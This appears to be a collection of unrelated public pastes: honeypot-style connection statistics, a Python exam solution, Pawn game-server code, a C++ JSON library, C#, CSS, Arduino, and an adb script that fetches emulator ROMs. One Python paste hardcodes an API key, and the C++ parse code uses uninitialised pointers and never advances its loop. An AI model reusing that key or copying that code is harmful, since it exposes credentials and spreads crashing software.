    ""AS3367"": 2,
    ""AS62240"": 1,
    ""AS213010"": 10,
    ""AS396982"": 6,
    ""AS397423"": 1,
    ""AS14061"": 1,
    ""AS63737"": 2,
    ""AS63949"": 1,
    ""AS51852"": 1,
    ""AS44486"": 4,
    ""AS16276"": 2,
    ""AS45090"": 4
  },
  ""isp"": {
    ""Unified Layer"": 27,
    ""Chang Way Technologies Co. Limited"": 25,
    ""Flyservers S.A."": 10,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 7,
    ""M247 Europe SRL"": 3,
    ""Korea Telecom"": 7,
    ""Ideastack Solutions Private Limited"": 11,
    ""TOV E-RISHENNYA"": 6,
    ""Dmitriy Panchenko"": 6,
    ""Hangzhou Alibaba Advertising Co"": 20,
    ""Alibaba (US) Technology Co., Ltd."": 5,
    ""Telefonica Data Chile S.A."": 1,
    ""Xplornet Communications Inc."": 2,
    ""Clouvider Limited"": 1,
    ""GigaHostingServices OU"": 10,
    ""Google LLC"": 6,
    ""Addresses CNNIC"": 9,
    ""Tier.Net Technologies LLC"": 1,
    ""DigitalOcean, LLC"": 1,
    ""Vietserver Services Technology Company Limited"": 2,
    ""Akamai Technologies, Inc."": 1,
    ""Private Layer INC"": 1,
    ""LIVINGBOTS"": 4,
    ""OVH SAS"": 2,
    ""China Internet Network Information Center"": 4
  },
  ""org"": {
    ""WEBSITEWELCOME.COM"": 27,
    ""Chang Way Technologies Co. Limited"": 20,
    ""UAB Host Baltic"": 6,
    ""Censys, Inc"": 2,
    ""Starcrecium Limited"": 5,
    ""Xhost Internet Solutions"": 11,
    ""M247 Ltd New York"": 1,
    ""Censys, Inc."": 1,
    ""Kornet"": 7,
    ""Flyservers S.A"": 4,
    ""Ideastack solutions private limited"": 11,
    ""TOV VAIZ PARTNER"": 6,
    ""Xhostis"": 2,
    ""Aliyun Computing Co., LTD"": 29,
    ""Alibaba.com Singapore E-Commerce Private Limited"": 5,
    ""CTC. CORP S.A. (TELEFONICA EMPRESAS)"": 1,
    ""Xplornet Communications Inc"": 2,
    ""Ipxo Limited"": 1,
    ""M247 Ltd Los Angeles"": 2,
    ""GigaHostingServices OU"": 10,
    ""Palo Alto Networks, Inc"": 6,
    ""Tier.Net Technologies LLC"": 1,
    ""DigitalOcean, LLC"": 1,
    ""VietServer Services technology company limited"": 2,
    ""Linode"": 1,
    ""Private Layer Inc"": 1,
    ""Unknown"": 4,
    ""OVH Ltd"": 2,
    ""Tencent cloud computing (Beijing) Co., Ltd."": 4
  },
  ""regionName"": {
    ""Utah"": 27,
    ""Moscow"": 24,
    ""Vilnius"": 6,
    ""Michigan"": 2,
    ""Chechnya"": 5,
    ""North Holland"": 9,
    ""New York"": 1,
    ""Hesse"": 1,
    ""Gangwon-do"": 7,
    ""Kaunas"": 4,
    ""Karnataka"": 11,
    ""Kyiv City"": 6,
    ""Beijing"": 15,
    ""Central and Western District"": 5,
    ""Zhejiang"": 5,
    ""Santiago Metropolitan"": 1,
    ""New Brunswick"": 2,
    ""Georgia"": 1,
    ""Washington"": 2,
    ""Mazovia"": 10,
    ""California"": 6,
    ""Shandong"": 9,
    ""Texas"": 2,
    ""New South Wales"": 1,
    ""Hanoi"": 2,
    ""Zurich"": 1,
    ""Bremen"": 4,
    ""England"": 2,
    ""Shanghai"": 4
  },
  ""country"": {
    ""United States"": 41,
    ""Russia"": 29,
    ""Lithuania"": 10,
    ""Netherlands"": 9,
    ""Germany"": 5,
    ""South Korea"": 7,
    ""India"": 11,
    ""Ukraine"": 6,
    ""China"": 33,
    ""Hong Kong"": 5,
    ""Chile"": 1,
    ""Canada"": 2,
    ""Poland"": 10,
    ""Australia"": 1,
    ""Vietnam"": 2,
    ""Switzerland"": 1,
    ""United Kingdom"": 2
  },
  ""account"": {
    ""hello"": 95,
    ""Domain"": 34,
    ""Test"": 14,
    ""(empty)"": 4,
    ""Administr"": 22,
    ""hefeCMZQU"": 1,
    ""KMkPap"": 1,
    ""oyhgKp"": 1,
    ""eWRJBDCYJ"": 1,
    ""qcaLoa"": 1,
    ""wOohOc"": 1
  },
  ""keyboard"": {
    ""Unknown"": 175
  },
  ""client_build"": {
    ""Unknown"": 175
  },
  ""client_name"": {
    ""Unknown"": 175
  },
  ""ip_type"": {
    ""hosting"": 72,
    ""proxy"": 15,
    ""Unknown"": 84,
    ""hosting & proxy"": 3,
    ""mobile & hosting"": 1
  }
}"
pCg9kZCf,8 задача ЕГЭ,impressive_i,Python,Friday 2nd of June 2023 07:11:40 PM CDT,"'''
Все 5-буквенные слова, составленные из букв А, О, У,
записаны в алфавитном порядке. Вот начало списка:
1.  ААААА
2.  ААААО
3.  ААААУ
4.  АААОА
……
Запишите слово, которое стоит на 210-м месте от начала списка.

Репетитор IT mentor  dzen.ru/itmentor   t.me/mentor_it 
'''

w = {0:""А"", 1:""О"", 2:""У""}    # наш словарь, по которому соберем слово

number = 0  # номер строки, начинается с нуля
L = len(w)  # длина алфавита. 3 - кол-во возможных символов на разряд
for a in range(0, L): # у нас всего 5 букв, поэтому далее будет
    for b in range(0, L): # 5 вложенных циклов for, где каждая буква
        for c in range(0, L): # будет пробегать свои числовые значения
            for d in range(0, L): # он минимальных до максимальных
                for e in range(0, L): # последняя буква обозначена за e
                    number += 1 # и тут мы сначала увеличиваем номер строки
                    if number == 210: # а потом выводим нужное слово
                        print(f'{number} - {w[a]}{w[b]}{w[c]}{w[d]}{w[e]}')
                        # строка форматируется и подставляется вместо
                        # a, b, c, d, e подставляются нужные индексы
                        # в наш словарь w, а словарь по этим ключам
                        # возвращает нужные буквы нашего алфавита.
                        # Получается слово. Конец :)"
0XrNWyXa,Ppc _Trucks,Diego_Bueno,Pawn,Friday 2nd of June 2023 07:00:13 PM CDT,"// This file holds an array of defined Trucks, used in the /Truck dialog



enum TTruck
{
	TruckName[50], // Holds the name of the Truck
	TruckModel // Holds the model-ID of the Truck
}

new ATrucks[][TTruck] =
{
	{""Roadtrain"", 515},		{""Linerunner"", 403}, 	{""Tanker"", 514},	{""Flatbed"", 455},       // ID 0, 1, 2, 3
	{""DFT-30"", 578},		{""Cement Truck"", 524}             									// ID 4, 5
	
};


// This function creates a list of Trucks, starting from the FirstTruck and automatically shows the dialog
TruckList_Create(playerid)
{
	// Setup local variables
	new Counter, TruckList[500], DialogTitle[128];

	// Only add 10 Trucks to the list, starting from the FirstTruck
	for (new i = APlayerData[playerid][DialogTruckFirstTruck]; i < sizeof(ATrucks); i++)
	{
		// Increase a counter (which holds the number of Trucks that have been added to the list
		Counter++;

		// Check if the maximum hasn't been reached yet
		if (Counter <= 10)
		{
		    // Add the Truckname to the list
		    if (strlen(TruckList) == 0) // If this is the start of the list (no Trucks have been added yet)
				format(TruckList, 500, ""%s"", ATrucks[i][TruckName]); // Add the name of the Truck at the start of the Trucklist
		    else
				format(TruckList, 500, ""%s%s%s"", TruckList, ""\n"", ATrucks[i][TruckName]); // Add the name of the next Truck to the list on the next line
		}
		else // 10 Trucks have been added to the list (now Counter = 11)
		{
		    // Add an empty line and ""Next..."" to the list to let the player know there are more Trucks to choose from
			format(TruckList, 500, ""%s%s%s"", TruckList, ""\n \n"", TXT_DialogEntryNext);
			// Also stop the For-loop
			break;
		}
	}

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, TXT_DialogTruckTitle, (APlayerData[playerid][DialogTruckFirstTruck] / 10) + 1);
	// Ask which Truck the player wants to have by showing the dialog
	ShowPlayerDialog(playerid, DialogTruck, DIALOG_STYLE_LIST, DialogTitle, TruckList, TXT_DialogButtonSpawn, TXT_DialogButtonCancel);

	return 1;
}
"
N1n8dfCq,Ppc_Dialogs,Diego_Bueno,Pawn,Friday 2nd of June 2023 06:52:23 PM CDT,"
// Process the Truck dialog
Dialog_Truck(playerid, response, listitem)
{
	// Just close the dialog if the player clicked ""Cancel""
	if(!response)
	{
		// Reset the FirstPlane (so the list won't start at an unexpected location in the list, but back at the start of the list)
		APlayerData[playerid][DialogTruckFirstTruck] = 0;
		return 1; // Exit the function
	}

	// Process the selected listitem
	switch (listitem)
	{
		case 10: // Player chooses the empty line between the Planelist and ""Next..."", so refresh the current list
		{
		    // Refresh the current list of Planes and let the player choose one (show dialog)
		    TruckList_Create(playerid);
			// Exit the function
			return 1;
		}
		case 11: // Player chooses ""Next...""
		{
		    // Add 10 to the FirstPlane, so the list will start further down the array (will show the next 10 Planes)
		    APlayerData[playerid][DialogTruckFirstTruck] = APlayerData[playerid][DialogTruckFirstTruck] + 10;
		    // Create a new list of Planes and show the dialog
		    TruckList_Create(playerid);
		}
		default: // Player chooses a Plane
		{
		    // Setup local variables
	    	new Float:x, Float:y, Float:z, Float:rot, TruckIndex, msg[128], vID, pName[24];
			new engine,lights,alarm,doors,bonnet,boot,objective;

			// FirstPlane is the index of the first Plane in the list, so select the proper index when a Plane is chosen by the player
			TruckIndex = APlayerData[playerid][DialogTruckFirstTruck] + listitem;

			// Get the player's position and name
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, rot);
			GetPlayerName(playerid, pName, 24);
			vID = Vehicle_Create(ATrucks[TruckIndex][TruckModel], x, y, z, rot, random(126), random(126), 600);
			// Put the player in the vehicle
			PutPlayerInVehicle(playerid, vID, 0);
			// Turn on the engine and lights
			GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vID, 1, 1, alarm, doors, bonnet, boot, objective);
			// Store the player's current location and interior-id, otherwise anti-airbreak hack code could kick you
			GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
			APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
			// Inform the player about it
			format(msg, 128, TXT_PlayerSpawnedVehicle, pName, vID, ATrucks[TruckIndex][TruckModel], x, y, z);
			SendClientMessageToAll(0xFFFFFFFF, msg);
			// Also, after spawning a vehicle, reset FirstPlane (so next time, the list starts from the start)
			APlayerData[playerid][DialogTruckFirstTruck] = 0;
		}
	}

	return 1;
}
"
QUH5LhLa,Ppc_Defines,Diego_Bueno,Pawn,Friday 2nd of June 2023 06:49:05 PM CDT,"
// Setup all the fields required for the player data (Speedometer TextDraw, current job, ...)
enum TPlayerData
{
	PlayerPassword[50], // Holds the password of the player's account
	PlayerNewPassword[50], // Holds the new password for the player
	PlayerLevel, // The admin-level of the player
	PlayerJailed, // Holds jail-time left for this player
	PlayerJailedTimer, // Holds the reference to the jail-timer
	PlayerFrozen, // Holds the time this player is frozen
	PlayerFrozenTimer, // Holds the reference to the frozen-timer
	Warnings, // Holds the number of warnings for this player
	Bans, // Holds the number of bans for this player
	BanTime, // Holds the time where the player is unbanned automatically (when the ban is over)
	bool:LoggedIn, // Holds true if the player has properly logged in
	bool:Muted, // Holds ""true"" if the player is muted
	bool:RulesRead, // Holds ""true"" if the player accepted the rules
	AutoReportTime, // Used to prevent the anti-hack system reporting the player every half a second when the player uses hacks

	TruckerLicense, // Holds ""1"" if the player has acquired his truckers-license
    PilotLicense,
	BusLicense, // Holds ""1"" if the player has acquired his busdriver license
	TaxiLicense,
	WeaponLicense,
	PlayerMoney, // Holds the money of this player
	PlayerScore, // Holds the score of this player
	PlayerName[24], // Holds the name of the player

	Houses[MAX_HOUSESPERPLAYER], // Holds the HouseID's of the houses that the player owns (index of the AHouseData array)
    CurrentHouse, // Holds the HouseID to track in which house the player currently is (used when accessing the housemenu)
	Business[MAX_BUSINESSPERPLAYER], // Holds the BusinessID's of the business that the player owns
	CurrentBusiness, // Holds the BusinessID to track in which business the player currently is (used when accessing the businessmenu)

	PlayerClass, //Holds the Class that the player chose (1 = truckdriver, 2 = taxidriver, ... -> see DEFINES)

	SpectateID, // Holds the ID of the other player which this player is spectating
	SpectateVehicle, // If the target player is inside a vehicle, store it here
	SpectateType, // Holds the type of spectating (none, player or vehicle)

	Float:PreviousX, // Holds the previous X location of the player (used to detect airbreak hacks)
	Float:PreviousY, // Holds the previous Y location of the player (used to detect airbreak hacks)
	Float:PreviousZ, // Holds the previous Z location of the player (used to detect airbreak hacks)
	PreviousInt, // Holds the previous interior id (used to detect airbreak hacks)

	StatsTruckerJobs, // Holds the number of succesfully completed trucker-missions
	StatsConvoyJobs, // Holds the number of completed trucking-routes when in a convoy
	StatsBusDriverJobs, // Holds the number of completed busroutes
	StatsTaxiDriverJobs,
	StatsPilotJobs, // Holds the number of completed pilot-missions
	StatsMafiaJobs, // Holds the number of completed mafia-missions
	StatsMafiaStolen, // Holds the number of succesfully deliveries of stolen mafialoads
	StatsPoliceFined, // Holds the number of fined players for police
	StatsPoliceJailed, // Holds the number of jailed players for police
	StatsCourierJobs, // Holds the number of completed courier-jobs
	StatsTrashJobs, // Holds the number of completed courier-jobs
	StatsAssistance, // Holds the number of player-vehicles that this player has repaired/refuelled
	StatsRoadworkerJobs, // Holds the number of completed roadworker jobs
	StatsMechanic,
	Float:StatsMetersDriven, // Holds the total kilometers that the player has driven already

	Text:SpeedometerText, // The TextDraw of the speedometer for this player
	Text:FuelGauge, // The textdraw of the fuel-gauge for this player
	SpeedometerTimer, // Holds the reference to the speedometer timer for this player
	PlayerSpeed, // Holds the speed of the player
	PlayerCaughtSpeeding, // This holds a value to prevent being caught multiple times by the same speedcamera

	Timer_PoliceCanJailMe, // This holds a reference to the timer which is started when the player got warned by a police player
	Value_PoliceCanJailMe, // This holds the remaining time for the Timer_PoliceCanJailPlayer timer
	bool:PoliceCanJailMe, // This holds ""true"" when the player was warned by a police player but didn't stop before the timer ran out
	bool:PoliceWarnedMe, // This holds ""true"" is the player got caught by a police player and got at least one warning

	bool:AssistanceNeeded, // Holds ""true"" is the player called for medical assistance
	bool:MechanicNeeded,    //Holds ""true"" is the player called for mechanic assistance

	bool:JobStarted, // States that the player has started a job or not
	Text:MissionText, // Displays the mission info at the bottom of the screen
	JobID, // Mission ID of the job (in the appropriate array, based on the PlayerClass), not used by truckers
	JobStep, // Current step of the job (for trucker: 1 = going to load, 2 = delivering goods to destination)
	Passengers, // Holds the number of passengers (used for busdriver, taxi classes)
	PlayerCheckTimer, // A special timer used by certain classes (police, mafia) to check players every second if they're wanted/carrying mafialoads
	LoadingTimer, // The timer used for loading and unloading during jobs
	VehicleTimerTime, // Holds the remaining seconds for the global vehicletimer
	VehicleID, // Holds the ID of the vehicle that the player is driving during his job
	TrailerID, // Holds the ID of the trailer that the player has attached during his job (is 0 if no trailer attached)
	LoadID, // Holds the ID of the load
	JobLoc1, // Holds the LocationID where to pickup the load (used in trucking missions)
	JobLoc2, // Holds the LocationID where to deliver the load (used in trucking missions)
	bool:Overloaded, // Holds True if the player's vehicle is overloaded (wanted level increases by 2)
	bool:MafiaLoad, // Holds True is the player's load is wanted by the mafia
	bool:MafiaLoadHijacked, // Holds true if the mafia-player has hijacked a mafia-load
	bool:InConvoy, // Holds true if the player has joined a convoy already
	ConvoyID, // Holds the ID of the convoy where this player is a member
	CourierHouses[11], // This holds up to 10 HouseID's for use during Courier-missions
	CourierMaxStep, // This holds the max number of houses to deliver packages to
	TrashHouses[11], // This holds up to 10 HouseID's for use during Courier-missions
	TrashMaxStep, // This holds the max number of houses to deliver packages to

	DialogFirstItem, // Holds the first array-index where a split dialog must start
	DialogCarFirstCar, // Holds the first array-index where the carlist should start when the player asks to choose a car to spawn (""/car"")
	DialogPlaneFirstPlane, // Holds the first array-index where the planelist should start when the player asks to choose a plane to spawn (""/plane"")
	DialogTrailerFirstTrailer, // Holds the first array-index where the trailerlist should start when the player asks to choose a trailer to spawn (""/trailer"")
    DialogTruckFirstTruck,

	DialogRentVClass, // Holds the ID of the chosen vehicle class to process when renting a vehicle
	DialogRentCarIndex, // Holds the index in the ABuyableVehicles array which vehicle the player chose to rent
	DialogBuyVClass, // Holds the ID of the chose vehicle class to process when buying a vehicle
	DialogBuyCarIndex, // Holds the index in the ABuyableVehicles array which vehicle the player chose to buy

	DialogGetCarHouseID, // Holds the HouseID from which to get a vehicle when using /getcar

	DialogOtherPlayer, // Holds the id of the other player when viewing that other player's stats
	DialogOtherPlayerHouse, // Holds the HouseID of the other player when viewing the stats for that house

	BankPassword[24], // Bank-system: Used to hold the password to your bank-account
	bool:BankLoggedIn, // Bank-system: Used to determine if you have logged in to your bank account
	BankMoney, // Bank-system: Used to hold the money in your bank-account
	UseMoney, // Bank-system: Used to hold the money you're be transferring to another player's account
	LastIntrestTime, // Bank-system: Used to hold the last time where your bank account has received intrest

	RentedVehicleID // Holds the vehicle-id of the rented vehicle (if any)
}
"
ABsUDSJ3,Untitled,klebermo,C++,Friday 2nd of June 2023 06:27:17 PM CDT,"#include <string>
#include <vector>
#include <map>

enum Type {
    object,
    array,
    string,
    number,
    boolean,
    null
};

class Value {
public:
    virtual ~Value() = 0;
    Type getType();
    virtual std::string toString() const = 0;
    virtual Value* parse(const std::string& jsonString) = 0;
};

class JSONString : public Value {
public:
    JSONString(std::string value);
    ~JSONString();
    std::string getValue();
    std::string toString() const override;
    JSONString* parse(const std::string& json_string) override;
};

class JSONNumber : public Value {
public:
    JSONNumber(double value);
    ~JSONNumber();
    double getValue();
    std::string toString() const override;
    JSONNumber* parse(const std::string& json_string) override;
};

class JSONBoolean : public Value {
public:
    JSONBoolean(bool value);
    ~JSONBoolean();
    bool getValue();
    std::string toString() const override;
    JSONBoolean* parse(const std::string& json_string) override;
};

class JSONArray : public Value {
private:
    std::vector<const Value*> values;
public:
    JSONArray();
    ~JSONArray();
    std::vector<const Value*> getValues();
    std::string toString() const override;
    JSONArray* parse(const std::string& json_string) override;
    void add(const Value* value);
    const Value* operator[](int index);
};

class JSONObject : public Value {
private:
    std::map<std::string, const Value*> values;
public:
    JSONObject();
    ~JSONObject();
    std::map<std::string, const Value*> getValues();
    std::string toString() const override;
    JSONObject* parse(const std::string& json_string) override;
    void add(const std::string& key, const Value* value);
    const Value* operator[](const std::string key);
};
"
5d4wm6Bt,openweather,teslariu,Python,Friday 2nd of June 2023 06:09:59 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

from datetime import datetime
from pprint import pprint

lat = -34.61
lon = -58.38
API_key = ""6ce13bc6d5a965e991adaea8fce8676a""

url = f""https://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&units=metric&lang=es&appid={API_key}""

r = requests.get(url)

data = r.json()
pprint(data)

print(f""\nPronostico principal"")
pprint(data['main'])

print()
print(f""Salida del sol: {datetime.fromtimestamp(data['sys']['sunrise'])}"")
print(f""Puesta del sol: {datetime.fromtimestamp(data['sys']['sunset'])}"")"
CMXkpUCb,Android Load RetroArch Game Rom from adb shell,metalx1000,Bash,Friday 2nd of June 2023 06:08:18 PM CDT,"#install retroarch
wget -c ""https://buildbot.libretro.com/stable/1.15.0/android/RetroArch.apk""
adb install RetroArch.apk
#load retroarch and install cores [example: mame-current]

#Download and push roms to Android device
wget -c ""https://archive.org/download/mame-merged/mame-merged/qsound_hle.zip""
wget -c ""https://archive.org/download/mame-merged/mame-merged/mvsc.zip""
adb shell mkdir -p /sdcard/roms/mame
adb push mvsc.zip qsound_hle.zip /sdcard/roms/mame

#make sure retroarch is closed
adb shell am force-stop com.retroarch

#cores can be found in /data/data/com.retroarch/cores/
#although you will need root to list them through the shell
#another option it find core commands is here:
#https://pegasus-frontend.org/tools/metagen-android/

#load game with core
adb shell am start -n com.retroarch/.browser.retroactivity.RetroActivityFuture -e ROM /sdcard/roms/mame/mvsc.zip -e LIBRETRO /data/data/com.retroarch/cores/mamearcade_libretro_android.so -e CONFIGFILE /storage/emulated/0/Android/data/com.retroarch/files/retroarch.cfg -e QUITFOCUS --activity-clear-task --activity-clear-top --activity-no-history

"
GkU6rKc0,Untitled,ensbro,C#,Friday 2nd of June 2023 06:01:53 PM CDT," public async Task<List<Zaposleni>> VratiZaposlene(string sortBy, string sortOrder, string filterBy, int page, int pageSize)
        {
            IQueryable<Zaposleni> sviZaposleni;
            if(sortBy != """")
            {
                switch(sortBy)
                {
                    case ""name"":
                        if (string.Equals(sortOrder, ""desc"", StringComparison.OrdinalIgnoreCase))
                            sviZaposleni = _dbContext
                            .Zaposleni
                            .OrderByDescending(z => z.Ime);
                        else
                            sviZaposleni = _dbContext
                            .Zaposleni
                            .OrderBy(z => z.Ime);
                        break;

                    default:
                        sviZaposleni = _dbContext.Zaposleni;
                        break;
                }
            } else
            {
                sviZaposleni = _dbContext.Zaposleni;
            }

            if(filterBy != """")
                sviZaposleni = sviZaposleni.Where(z => z.Ime == filterBy);


            var brojZaposlenih = sviZaposleni.Count<Zaposleni>();
            var brojStranica = (int)Math.Ceiling(brojZaposlenih / (double)pageSize);
            sviZaposleni = sviZaposleni.Skip((page - 1) * pageSize).Take(pageSize);

            var sviZaposleniList = await sviZaposleni.ToListAsync();
            return sviZaposleniList;
        }"
fBZHrYhg,chessdb.cn userstyle,Aelya,CSS,Friday 2nd of June 2023 05:49:35 PM CDT,".snow::before {
    background: none;
}

body {
    background: rgb(5, 35, 55); margin: 10px 20px 20px; font: normal 14px/1.2 Noto Sans;
    color: rgb(252, 252, 255);
    line-height: 16px;
}

html {
    background: rgb(5, 15, 35);
}

a:link {
    color: rgb(202, 204, 255)
}

a:visited {
    color: rgb(238, 182, 255)
}

.hovoff {
    background: rgb(5, 35, 55);
}   

.unselpiece {
    background: rgb(25, 55, 75);
}

.button, .mbutton {
    border-color: black rgb(252, 252, 255) rgb(252, 252, 255) black; color: rgb(252, 252, 255); background-color: rgb(0, 90, 145);
}
"
4z6g9dPd,Untitled,klebermo,C++,Friday 2nd of June 2023 05:44:03 PM CDT,"#include <iostream>

#include ""json.hpp""

int main() {
    JSONObject * jsonObject = new JSONObject();

    jsonObject->add(""name"", new JSONString(""John Doe""));
    jsonObject->add(""age"", new JSONNumber(25));
    jsonObject->add(""isStudent"", new JSONBoolean(true));

    JSONArray * jsonArray = new JSONArray();

    jsonArray->add(new JSONString(""apple""));
    jsonArray->add(new JSONString(""banana""));
    jsonArray->add(new JSONString(""orange""));

    jsonObject->add(""fruits"", jsonArray);

    // Convertendo para string JSON
    std::string jsonString = jsonObject->toString();
    std::cout << ""JSON String: "" << jsonString << std::endl;

    // Liberando a memória alocada
    delete (*jsonObject)[""name""];
    delete (*jsonObject)[""age""];
    delete (*jsonObject)[""isStudent""];
    delete (*jsonObject)[""fruits""];

    return 0;
}
"
5NfEveih,Untitled,klebermo,C++,Friday 2nd of June 2023 05:43:01 PM CDT,"#include <vector>
#include <map>
#include <string>

enum Type {
    object,
    array,
    string,
    number,
    boolean,
    null
};

class Value {
protected:
    Type type;
public:
    virtual ~Value() = 0;
    Type getType();
    virtual std::string toString() const = 0;
    virtual Value* parse(const std::string& jsonString) = 0;
};

Value::~Value() {
    //
}

Type Value::getType()  {
        return this->type;
}

class JSONString : public Value {
private:
    std::string value;
public:
    JSONString(std::string value);
    ~JSONString();
    std::string getValue();
    std::string toString() const override;
    JSONString* parse(const std::string& json_string) override;
};

JSONString::JSONString(std::string value) {
    this->value = value;
    this->type = string;
}

JSONString::~JSONString() {
    //
}

std::string JSONString::getValue() {
    return this->value;
}

std::string JSONString::toString() const {
    return ""\"""" + value + ""\"""";
}

JSONString* JSONString::parse(const std::string& json_string) {
    if (json_string.length() >= 2 && json_string.front() == '""' && json_string.back() == '""') {
        value = json_string.substr(1, json_string.length() - 2);
        return this;
    }
    return nullptr;
}

class JSONNumber : public Value {
private:
    double value;
public:
    JSONNumber(double value);
    ~JSONNumber();
    double getValue();
    std::string toString() const override;
    JSONNumber* parse(const std::string& json_string) override;
};

JSONNumber::JSONNumber(double value) {
    this->value = value;
    this->type = number;
}

JSONNumber::~JSONNumber() {
    //
}

std::string JSONNumber::toString() const {
    return std::to_string(value);
}

double JSONNumber::getValue() {
    return this->value;
}    

JSONNumber* JSONNumber::parse(const std::string& json_string) {
    try {
        value = std::stod(json_string);
        return this;
    } catch (...) {
        return nullptr;
    }
}

class JSONBoolean : public Value {
private:
    bool value;
public:
    JSONBoolean(bool value);
    ~JSONBoolean();
    bool getValue();
    std::string toString() const override;
    JSONBoolean* parse(const std::string& json_string) override;
};

JSONBoolean::JSONBoolean(bool value) {
    this->value = value;
    this->type = boolean;
}

JSONBoolean::~JSONBoolean() {
    //
}

std::string JSONBoolean::toString() const {
    return value ? ""true"" : ""false"";
}

bool JSONBoolean::getValue() {
    return this->value;
}    

JSONBoolean* JSONBoolean::parse(const std::string& json_string) {
    if (json_string == ""true"") {
        value = true;
        return this;
    } else {
        value = false;
        return this;
    }
    return nullptr;
}

class JSONArray : public Value {
private:
    std::vector<const Value*> values;
public:
    JSONArray();
    ~JSONArray();
    std::vector<const Value*> getValues();

    void add(const Value* value);
    const Value* operator[](int index);

    std::string toString() const override;
    JSONArray* parse(const std::string& json_tring) override;
};

JSONArray::JSONArray() {
    this->type = array;
}

JSONArray::~JSONArray() {
    for(auto value : values) {
        delete value;
    }
    values.clear();
}

std::vector<const Value*> JSONArray::getValues() {
    return this->values;
}

void JSONArray::add(const Value* value) {
    values.push_back(value);
}

const Value* JSONArray::operator[](int index) {
    return values[index];
}

std::string JSONArray::toString() const {
    std::string result = ""["";
    for (size_t i = 0; i < values.size(); ++i) {
        result += values[i]->toString();
        if (i < values.size() - 1) {
            result += "","";
        }
    }
    result += ""]"";
    return result;
}

class JSONObject : public Value {
private:
    std::map<const std::string, const Value*> values;
public:
    JSONObject();
    ~JSONObject();
    std::map<const std::string, const Value*> getValues();

    void add(const std::string& key, const Value* value);
    const Value* operator[](const std::string key);

    std::string toString() const override;
    JSONObject* parse(const std::string& json_tring) override;
};

JSONObject::JSONObject() {
    this->type = object;
}

JSONObject::~JSONObject() {
    for(auto it = values.begin(); it != values.end(); ++it) {
        delete it->second;
    }
    values.clear();
}

std::map<const std::string, const Value*> JSONObject::getValues() {
    return this->values;
}

void JSONObject::add(const std::string& key, const Value* value) {
    values[key] = value;
}

const Value* JSONObject::operator[](const std::string key) {
    return values[key];
}

std::string JSONObject::toString() const {
    std::string result = ""{"";
    for (auto it = values.begin(); it != values.end(); ++it) {
        result += ""\"""" + it->first + ""\"":"" + it->second->toString();
        if (std::next(it) != values.end()) {
            result += "","";
        }
    }
    result += ""}"";
    return result;
}

JSONObject* JSONObject::parse(const std::string& json_string) {
    if (json_string.length() >= 2 && json_string.front() == '{' && json_string.back() == '}') {
        JSONObject* jsonObject = new JSONObject();
        std::string elementsString = json_string.substr(1, json_string.length() - 2);
        size_t startPos = 0;
        size_t endPos = 0;
        while (endPos != std::string::npos) {
            endPos = elementsString.find(',', startPos);
            std::string elementString = elementsString.substr(startPos, endPos - startPos);
            size_t colonPos = elementString.find(':');
            if (colonPos != std::string::npos) {
                std::string key = elementString.substr(0, colonPos);
                std::string valueString = elementString.substr(colonPos + 1);

                Value* elementValue;
                if (json_string.empty()) {
                    elementValue = nullptr;
                }
                if (JSONBoolean* jsonBoolean = jsonBoolean->parse(json_string)) {
                    elementValue = jsonBoolean;
                }
                if (JSONNumber* jsonNumber = jsonNumber->parse(json_string)) {
                    elementValue = jsonNumber;
                }
                if (JSONString* jsonString = jsonString->parse(json_string)) {
                    elementValue = jsonString;
                }
                JSONArray * jsonArray = new JSONArray();
                if (jsonArray->parse(json_string)) {
                    elementValue = jsonArray;
                }
                if (JSONObject* jsonObject = jsonObject->parse(json_string)) {
                    elementValue = jsonObject;
                }

                if (elementValue) {
                    jsonObject->add(key, elementValue);
                }

            }
        }
        return jsonObject;
    }
    return nullptr;
}

JSONArray* JSONArray::parse(const std::string& json_string) {
    if (json_string.length() >= 2 && json_string.front() == '[' && json_string.back() == ']') {
        JSONArray* jsonArray = new JSONArray();
        std::string elementsString = json_string.substr(1, json_string.length() - 2);
        size_t startPos = 0;
        size_t endPos = 0;
        while (endPos != std::string::npos) {
            endPos = elementsString.find(',', startPos);
            std::string elementString = elementsString.substr(startPos, endPos - startPos);

            Value* elementValue;
            if (json_string.empty()) {
                elementValue = nullptr;
            }
            if (JSONBoolean* jsonBoolean = jsonBoolean->parse(json_string)) {
                elementValue = jsonBoolean;
            }
            if (JSONNumber* jsonNumber = jsonNumber->parse(json_string)) {
                elementValue = jsonNumber;
            }
            if (JSONString* jsonString = jsonString->parse(json_string)) {
                elementValue = jsonString;
            }
            if (JSONArray* jsonArray = jsonArray->parse(json_string)) {
                elementValue = jsonArray;
            }
            JSONObject* jsonObject = new JSONObject();
            if (jsonObject->parse(json_string)) {
                elementValue = jsonObject;
            }

            if (elementValue) {
                jsonArray->add(elementValue);
            }
            startPos = endPos + 1;
        }
        return this;
    }
    return nullptr;
}
"
BewQQnFC,Servo/dht,Yilltronics,Arduino,Friday 2nd of June 2023 04:19:00 PM CDT,"#include <DHT.h>
#include <LiquidCrystal_I2C.h>
#include <Wire.h>
#include <Keypad.h>
#include <Servo.h>  

// Constants
#define DHTPIN 7     // Pin to which the DHT11 sensor is connected
#define DHTTYPE DHT11    // DHT 11 type sensor

// Variables
DHT dht(DHTPIN, DHTTYPE); // Initialize DHT sensor
int h;  // Stores humidity value
int t;  // Stores temperature value

LiquidCrystal_I2C lcd(0x27, 16, 2);

int estado=0;                  // 0=cerrado 1=abierto
Servo servo11;                 // Crea el objeto servo11 con las caracteristicas de Servo
const byte FILAS = 4;          // define numero de filas
const byte COLUMNAS = 4;       // define numero de columnas
char keys[FILAS][COLUMNAS] = {    // define la distribucion de teclas
  {'1','2','3','A'},
  {'4','5','6','B'},
  {'7','8','9','C'},
  {'*','0','#','D'}
};
byte pinesFilas[FILAS] = {13,12,11,10};         // pines correspondientes a las filas
byte pinesColumnas[COLUMNAS] = {6,5,4,3};  // pines correspondientes a las columnas
